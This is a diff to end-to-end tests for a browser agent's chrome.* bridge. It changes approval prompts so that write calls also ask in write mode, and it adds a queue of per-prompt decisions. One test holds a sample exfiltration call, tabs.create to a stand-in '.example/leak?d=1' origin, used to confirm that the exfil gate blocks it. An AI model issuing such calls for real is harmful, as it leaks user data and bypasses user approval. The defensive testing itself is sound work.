@@ -63,9 +63,11 @@ async function runBridgeTurn(
   path: string,
   args: unknown[],
   allow = true,
+  decisions: boolean[] = [],
 ): Promise<{ isError: boolean; text: string }> {
   let after = (await fa.eventCount()) - 1;
   await fa.sendUser(`tool browser_api ${JSON.stringify({ path, args })}`);
+  let prompt = 0;
   for (;;) {
     const evt = await fa.waitEvent(
       (e) =>
@@ -77,7 +79,13 @@ async function runBridgeTurn(
     if (evt.type === 'tool_result') {
       return { isError: evt.isError === true, text: String(evt.text ?? '') };
     }
-    await fa.decide(evt.id!, allow);
+    // An explicit decision queue overrides `allow` prompt-by-prompt
+    // (write-ask first, then the exfil ask).
+    await fa.decide(
+      evt.id!,
+      prompt < decisions.length ? decisions[prompt] : allow,
+    );
+    prompt++;
     // Advance the cursor past the prompt we just answered — waitEvent
     // returns the FIRST match after `after`, so without this the loop
     // re-decides the same approval forever.
@@ -217,7 +225,7 @@ test.describe.serial('chrome.* bridge (issue #137)', () => {
     expect(await promptsSince(fa, after3)).toHaveLength(1);
   });
 
-  test('AC5b: write mode — read/write auto-approve, exec still prompts', async ({
+  test('AC5b: write mode — reads silent; writes AND exec prompt (review r2)', async ({
     fa,
   }) => {
     await fa.bootAgent('write');
@@ -229,17 +237,20 @@ test.describe.serial('chrome.* bridge (issue #137)', () => {
     expect(read.isError, read.text).toBe(false);
     expect(await promptsSince(fa, after)).toEqual([]);
 
-    // Write path (AC4): bookmarks.create lands with no prompt, remove
-    // cleans up.
+    // Write path (AC4, review r2: write→exec): bookmarks.create PROMPTS
+    // in write mode too — no silent chrome.* write in any interactive
+    // mode. allow (default) answers it; remove likewise.
     after = (await fa.eventCount()) - 1;
     const created = await runBridgeTurn(fa, 'chrome.bookmarks.create', [
       { title: 'fa-bridge-e2e', url: fa.fixture.url },
     ]);
     expect(created.isError, created.text).toBe(false);
-    expect(await promptsSince(fa, after)).toEqual([]);
+    expect(await promptsSince(fa, after)).toHaveLength(1);
     const bm = envelopeOf(created.text).result as { id: string };
+    after = (await fa.eventCount()) - 1;
     const removed = await runBridgeTurn(fa, 'chrome.bookmarks.remove', [bm.id]);
     expect(removed.isError, removed.text).toBe(false);
+    expect(await promptsSince(fa, after)).toHaveLength(1);
 
     // Exec tier: STILL prompts in write mode — the mode never silently
     // runs the exec surface.
@@ -249,7 +260,7 @@ test.describe.serial('chrome.* bridge (issue #137)', () => {
     expect(await promptsSince(fa, after)).toHaveLength(1);
 
     // Hard deny with ZERO prompts: write mode's matrix is silent and the
-    // deny-list fires before the exec risk ask — straight data error.
+    // deny-list fires before the write/exec ask — straight data error.
     after = (await fa.eventCount()) - 1;
     const denied = await runBridgeTurn(fa, 'chrome.management.getSelf', []);
     expect(denied.isError, denied.text).toBe(false);
@@ -424,8 +435,10 @@ test.describe.serial('chrome.* bridge (issue #137)', () => {
   test('exfil gate: bridge tabs.create to an unvisited origin asks (M1)', async ({
     fa,
   }) => {
-    // write mode: the matrix is silent on the read tier, so the ONLY
-    // prompt mid-turn is the exfil ask (tabs.create → windowOpen).
+    // write mode: the matrix is silent on the read tier; tabs.create is
+    // a WRITE (review r2) so the write-ask fires first, then the exfil
+    // ask for the unvisited origin. Allow the write, DENY the exfil —
+    // the exfil gate is what blocks the call.
     await fa.bootAgent('write');
     await fa.collectEvents();
 
@@ -433,13 +446,15 @@ test.describe.serial('chrome.* bridge (issue #137)', () => {
       fa,
       'chrome.tabs.create',
       [{ url: 'https://unvisited-bridge-origin.example/leak?d=1' }],
-      false, // the user DENIES
+      true,
+      [true, false], // write-ask: allow; exfil ask: DENY
     );
     // Deny is error-as-data, never a thrown turn.
     expect(res.isError, res.text).toBe(false);
     const env = envelopeOf(res.text);
     expect(env.ok, res.text).toBe(false);
     expect(env.error?.code, res.text).toBe('approval_required');
+    expect(env.error?.message, res.text).toContain('unvisited-bridge-origin');
   });
 
   test('storage namespace is bridge-denied in every mode (M2)', async ({
